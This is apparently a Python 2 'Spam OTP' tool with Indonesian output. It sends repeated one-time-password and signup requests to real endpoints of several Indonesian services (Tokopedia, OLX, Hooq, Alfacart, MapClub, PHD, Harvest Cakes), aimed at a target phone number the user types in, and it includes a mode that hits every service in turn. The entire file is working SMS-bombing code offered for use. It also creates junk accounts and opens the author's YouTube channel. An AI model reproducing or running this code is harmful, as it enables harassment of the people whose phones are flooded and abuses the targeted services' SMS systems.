#!/usr/bin/python2
# Author : ./FUKUR0-3XP
# Team : Black Coders Anonymous Satanic Exploiter Team ( BCA - X666X )
# Apa Liat Liat ? Mau Recode ? >_<
# Recode Tidak Akan Membuat Anda Menjadi Pencipta Kode :3

M = '\033[1;31m'
H = '\033[1;32m'
K = '\033[1;33m'
U = '\033[1;34m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
A = '\033[90m'

try:
	
	import mechanize, requests, random, sys, os, re
	from time import sleep
	from cookielib import LWPCookieJar as Cookie
	from requests.exceptions import ConnectionError

	os.system('clear')

	def Tik(s):
		for i in s + '\n':
			sys.stdout.write(i)
			sys.stdout.flush()
			sleep(random.random() * 0.0010)
	
	def Banner():
		Tik(''+C+'''
	
 _____                         _____               
/  ___|                       /  ___|              
\ `--. _ __   __ _ _ __ ___   \ `--. _ __ ___  ___ 
 `--. \ '_ \ / _` | '_ ` _ \   `--. \ '_ ` _ \/ __|
/\__/ / |_) | (_| | | | | | | /\__/ / | | | | \__ \\
\____/| .__/ \__,_|_| |_| |_| \____/|_| |_| |_|___/
      | |                                          
      |_|  '''+W+'Creator : ./Fukur0\n\t\tYT : Jejak Cyber')

	def MapClub(Phone, Amount):
		for _ in range(Amount):

			sleep(5)
			headers = {
			'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
			'Referer' : 'https://mapclub.com/id/user/signup'
			}

			postData = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data = {'phone' : Phone}, allow_redirects = True)

			if 'error' in postData.text:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
			
			else:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
					
	def Hooq(Phone, Amount):
		for _ in range(Amount):

			sleep(5)
			bro = mechanize.Browser()
			Cookies = Cookie('.cookieslog')

			bro.set_handle_robots(False)
			bro.set_cookiejar(Cookies)

			bro.addheaders = [
			('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9'),
			('Referer', 'https://authenticate.hooq.tv/signupmobile?return?Url=https://www.hooq.tv/auth//verify/ev%2F%257Cid')
			]

			bro.open('https://authenticate.hooq.tv/signupmobile?returnUrl=https://www.hooq.tv%2Fauth%2Fverify%2Fev%2F%257Cid&serialNo=0&deviceType=webClient&modelNo=webclient-aurora&deviceName=webclient-aurora/production-8.4.1&deviceSignature=0')
			bro.select_form(nr=0)		
			bro.form ['mobile'] = str(Phone)
			submit = bro.submit()

			if 'Your+number+has+been+blocked.' in submit.geturl():
				print(W+'NOMOR TARGET UDAH DI BLOKIR\n'+C+'SAMA PIHAK HOOQ. '+W+'COBA NOMOR LAIN ^_^')
				sys.exit() 
			
			elif 'buCode' in submit.geturl():
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
			
			else:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' GAGAL'+M+' \xE2\x9C\x96')

	def HarVest(Phone, Amount):
		for _ in range(Amount):
		
			sleep(5)
			headers = {
			'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
			'Referer' : 'https://harvestcakes.com/register'
			}

			data = {
			'phone' : Phone,
			'url' : ''
			}

			Sess = requests.Session()
			Sess.cookies = Cookie('.cookieslog')
			Sess.headers = headers

			postData = Sess.post('https://harvestcakes.com/register', data = data, allow_redirects = True)

			if 'Enter OTP code we sent via SMS on phone number' in postData.text:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
				Sess.cookies.save()
			
			else:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' GAGAL'+M+' \xE2\x9C\x96')

	def Olx(Phone, Amount):
		for _ in range(Amount):
		
			sleep(5)
			headers = {
			'user-agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
			'referer' : 'https://www.olx.co.id/'
			}
	
			data = {
			'grantType' : 'phone',
			'phone' : Phone,
			'language' : ''
			}
		
			Sess = requests.Session()
			Sess.cookies = Cookie('.cookieslog')
			Sess.headers = headers
		
			postData = Sess.post('https://www.olx.co.id/api/auth/authenticate', json = data, allow_redirects = True)
		
			if 'PIN' and 'token' in postData.text:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
				Sess.cookies.save()
			
			else:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
			
	def Tokped(Phone, Amount):
		for _ in range(Amount):
		
			sleep(30)
			headers = {
			'Connection' : 'keep-alive',
			'Accept' : 'application/json, text/javascript, */*; q=0.01',
			'Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest',
			'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
			'Accept-Encoding' : 'gzip, deflate'
			}

			TokenSite = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+Phone+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D'+Phone+'%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = headers).text
			SearchToken = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', TokenSite).group(1)
		
			data = {
			'tk' : SearchToken,
			'msisdn' : Phone,
			'otp_type' : '116',
			'number_otp_digit' : '6',
			'email' : '',
			'original_param' : '',
			'user_id' : '',
			'signature' : '',
			}
		
			postData = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-sms', data = data, headers = headers)
		
			if '"success": true' in postData.text:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
			
			else:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
			
	def AlfaMart(Phone, Amount):
		for _ in range(Amount):
		
			sleep(5)
			headers = {
			'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
			'Referer' : 'https://www.alfacart.com/login?tab=daftar&return='
			}
		
			data = {
			'fullName' : 'Yt Jejak Cyber',
			'red' : 'customer%2Faccount',
			'email' : 'jejak@gmail.com',
			'password' : 'Subscribe Channel Gua Yak',
			'isNewsletter' : 'on'
			}
		
			Sess = requests.Session()
			Sess.cookies = Cookie('.cookieslog')
			Sess.headers = headers

			postData = Sess.post('https://www.alfacart.com/getMemberInfo', data = {'email' : 'jejak@gmail.com'})
			postData_2 = Sess.post('https://www.alfacart.com/otp/checkActiveNumber', data = {'phoneNumber' : Phone, 'email' : 'jejak@gmail.com'})
			postData_3 = Sess.post('https://www.alfacart.com/otp/phoneNumberRegistration', data = {'phoneNumber' : Phone})
			postData_4 = Sess.post('https://www.alfacart.com/doRegister', data = data)
		
			if 'responseMessage":"Nomor terverifikasi dan dapat diubah.","status":true' in postData_2.text:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
				Sess.cookies.save()
			
			else:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
	
	def Phd(Phone, Amount):
	
		if str(Phone).startswith('08', 0) == True:
			Phone = Phone.replace('08', '8')

		for _ in range(Amount):

			sleep(5)
			headers = {
			'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
			'Referer' : 'https://www.phd.co.id/en/users/createnewuser'
			}

			data = {
			'requests_id' : '',
			'first_name' : 'Subscribe YT',
			'last_name' : 'Jejak Cyber',
			'gender' : 'male',
			'phone_number' : Phone,
			'birthday' : '0000-00-00',
			'username' : 'YouTube@gmail.com',
			'password' : 'Subscribe 1000x Ya Anying',
			'agreeterms' : '1'
			}

			Sess = requests.Session()
			Sess.cookies = Cookie('.cookieslog')
			Sess.headers = headers

			postData = Sess.post('http://www.phd.co.id/en/users/createNewUser', data = data , allow_redirects = True)
			Sess.cookies.save()
		
			print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
		
	def Spam():
		Banner()
		print
		Tik(W+50*'=')
		Tik(C+'\tTOOLS\t\t LIMIT\t\tSTATUS')
		Tik(W+50*'=')
		print
		Tik(C+'['+W+'1'+C+']'+W+' SPAM OTP MAPCLUB'+W+'\tUNLIMITED'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'2'+C+']'+W+' SPAM OTP HOOQ'+W+'\tBELUM TAU'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'3'+C+']'+W+' SPAM OTP HARVEST'+W+'\t6X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'4'+C+']'+W+' SPAM OTP OLX'+W+'\tUNLIMITED'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'5'+C+']'+W+' SPAM OTP TOKOPEDIA'+W+'\t3X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'6'+C+']'+W+' SPAM OTP ALFAMART'+W+'\t4X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'7'+C+']'+W+' SPAM OTP PHD'+W+'\t3X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'8'+C+']'+W+' COMBO ALL 3 OTP'+K+'\t    -\t\t'+W+'ACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'9'+C+']'+W+' REPORT BUG'+K+'\t\t    -\t\t'+W+'ACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'X'+C+']'+W+' EXIT / KELUAR'+K+'\t    -\t\t'+W+'ACTIVE'+H+' \xE2\x9C\x94')
		print
		print
		try:
			requests.get('http://google.com')
	
		except ConnectionError:
			print
			print(M+'CEK KONEKSI JARINGAN !')
			sys.exit()
		
		PilihTools = raw_input(W+'Pilih Tools'+C+' ~> '+W+'')
		
		if PilihTools == '1':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP MAPCLUB')
				Tik(C+'\t\t'+16*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 10:
					print
					print(W+'\tJANGAN BANYAK BANYAK KALO GAK'+C+'\n\tMAU TOOLS INI MATI'+W+' ^_^')
					print
					sys.exit()
				
				else:
					pass
				
				print
				print(C+'\t-------------- '+W+'Starting'+C+' --------------')
				print
				MapClub(Phone, Amount)
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
		elif PilihTools == '2':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP HOOQ')
				Tik(C+'\t\t'+13*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 5:
					print
					print(W+'\tJANGAN BANYAK BANYAK KALO GAK'+C+'\n\tMAU TOOLS INI MATI'+W+' ^_^')
					print
					sys.exit()
				
				else:
					pass
				
				print
				print(C+'\t-------------- '+W+'Starting'+C+' --------------')
				print
				Hooq(Phone, Amount)
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
			
		elif PilihTools == '3':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP HARVEST')
				Tik(C+'\t\t'+17*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 5:
					print
					print(W+'\tJANGAN BANYAK BANYAK KALO GAK'+C+'\n\tMAU TOOLS INI MATI'+W+' ^_^')
					print
					sys.exit()
				
				else:
					pass
				
				print
				print(C+'\t-------------- '+W+'Starting'+C+' --------------')
				print
				HarVest(Phone, Amount)
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
			
		elif PilihTools == '4':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP OLX')
				Tik(C+'\t\t'+12*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 10:
					print
					print(W+'\tJANGAN BANYAK BANYAK KALO GAK'+C+'\n\tMAU TOOLS INI MATI'+W+' ^_^')
					print
					sys.exit()
				
				else:
					pass
				
				print
				print(C+'\t-------------- '+W+'Starting'+C+' --------------')
				print
				Olx(Phone, Amount)
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
	
		elif PilihTools == '5':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP TOKOPEDIA')
				Tik(C+'\t\t'+19*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 5:
					print
					print(W+'\tUDAH LEWAT LIMIT ITU JUMLAHNYA'+C+'^_^')
					print
					sys.exit()
				
				else:
					pass
				
				print
				print(C+'\t-------------- '+W+'Starting'+C+' --------------')
				print
				Tokped(Phone, Amount)
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
			
		elif PilihTools == '6':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP ALFAMART')
				Tik(C+'\t\t'+17*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 5:
					print
					print(W+'\tUDAH LEWAT LIMIT ITU JUMLAHNYA'+C+'^_^')
					print
					sys.exit()
				
				else:
					pass
				
				print
				print(C+'\t-------------- '+W+'Starting'+C+' --------------')
				print
				AlfaMart(Phone, Amount)
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
			
		elif PilihTools == '7':
			try:
				print
				Tik(W+'\t\tSPAM OTP PHD')
				Tik(C+'\t\t'+12*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
			
				else:
					pass
				
				Phone = int(Phone) 
				print
				print(C+'PHD'+W+' AUTO 3X SEND') 
				sleep(2)
				
				print
				print(C+'\t-------------- '+W+'Starting'+C+' --------------')
				print
				print(W+'JIKA TIDAK TERKIRIM, BERARTI SUDAH LIMIT !')
				print
				Phd(Phone, 3) # DON'T CHANGE / JANGAN DI UBAH
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
			
		elif PilihTools == '8':
			try:
			
				print
				Tik(W+'\t\tSPAM COMBO OTP')
				Tik(C+'\t\t'+14*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				print
				print(C+'\t-------------- '+W+'Starting'+C+' --------------')
				print
				print(C+'\t----------- '+W+'HOOQ 3X'+C+' -----------')
				print
				Hooq(Phone, 3)
				print
				print(C+'\t----------- '+W+'HARVEST 3X'+C+' -----------')
				print
				HarVest(Phone, 3)
				print
				print(C+'\t----------- '+W+'OLX 3X'+C+' -----------')
				print
				Olx(Phone, 3)
				print
				print(C+'\t----------- '+W+'TOKOPEDIA 3X'+C+' -----------')
				print
				Tokped(Phone, 3)
				print
				print(C+'\t----------- '+W+'ALFAMART 3X'+C+' -----------')
				print
				AlfaMart(Phone, 3)
				print
				print(C+'\t----------- '+W+'PHD 3X'+C+' -----------')
				print
				Phd(Phone, 3)
				print
				print(C+'\t----------- '+W+'MAPCLUB 3X'+C+' -----------')
				print
				MapClub(Phone, 3)
				print
				print(W+'Thanks Udah Coba Combo'+C+' ^_^')
				sys.exit()
			
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except ConnectionError:
				print
				print(M+'TERJADI KESALAHAN JARINGAN !')
				sys.exit()
		
		elif PilihTools == '9':
			os.system('xdg-open http://wa.me/6285880818385?text=Hallo')
		
		elif PilihTools == 'X' or PilihTools == 'x':
			print
			print(W+'Thanks, Jangan Lupa Balik Lagi'+C+' ^_^')
			sys.exit()
			
		else:
			print
			print(W+'Tools Tidak Di Temukan'+C+' ^_^')
		
except ImportError:
	os.system('clear')
	print(C+'Module Belum Terpasang'+W+' ^_^')
	print(W+'Install Module'+C+' ...')
	sleep(1.5)
	print
	os.system('pip2 install -r requirements.txt')
	print
	print(C+'Selesai'+W+' ^_^') 
	sleep(1.5)
	os.system('clear')
	
if __name__ == '__main__':
	print(C+'Subscribe YT'+W+' Gua Dlu Ya Su !'+C+' :V')
	sleep(2)
	os.system('clear')
	os.system('xdg-open https://www.youtube.com/channel/UCzsADl8XRJeZXJ6CKZLX5KQ')
	sleep(7)
	Spam()